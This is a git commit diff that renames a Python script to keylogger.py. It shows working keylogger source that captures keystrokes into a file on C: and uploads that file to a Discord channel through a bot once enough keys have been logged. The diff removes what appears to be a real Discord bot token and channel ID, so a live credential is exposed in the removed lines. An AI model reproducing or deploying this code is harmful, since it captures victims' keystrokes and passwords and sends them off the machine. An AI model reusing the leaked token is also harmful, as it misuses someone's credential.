041f3d88b29a144fbfdf5e408319d9dc9729bf9e
Caz Brecker <64892135+pranubaita@users.noreply.github.com>
2024-04-26 16:37:52 +0800

    Update and rename nodma.py to keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,16 +2,15 @@ import discord
 import asyncio
 import msvcrt
 
-TOKEN = 'MTIyOTcyNzIyOTM4MzI4Mjc0MQ.GPuo5j.eeiizozYP-0nDfmfj9BwQzWHBHabBp1tCI9MVQ'
-logfile = 'c:/nodma.xyz'
-channel_id = 1229728373803323424
+TOKEN = 'NUH-UH'
+logfile = 'c:/WINDOWS32.xyz'
+channel_id = 69420
 intents = discord.Intents.default()
 client = discord.Client(intents=intents)
 
 keypress_count = 0
 
 
-# Function to send file to Discord channel
 async def send_file():
     channel = client.get_channel(channel_id)
     if channel:
@@ -22,14 +21,12 @@ async def send_file():
         print("Channel not found.")
 
 
-# Event handler for Discord client
 @client.event
 async def on_ready():
     print('We have logged in')
     await detect_key_press()
 
 
-# Function to periodically check for key press
 async def detect_key_press():
     global keypress_count
     while True:
@@ -39,11 +36,9 @@ async def detect_key_press():
                 f.write('{}\n'.format(key))
             print(key)
             keypress_count += 1
-            if keypress_count == 1000:
+            if keypress_count == 10000:
                 await send_file()
-                keypress_count = 0  # Reset keypress count after sending the file
-        await asyncio.sleep(0.1)  # Adjust the sleep duration as needed
+                keypress_count = 0
+        await asyncio.sleep(0.1)
 
-
-# Start the bot
 client.run(TOKEN)
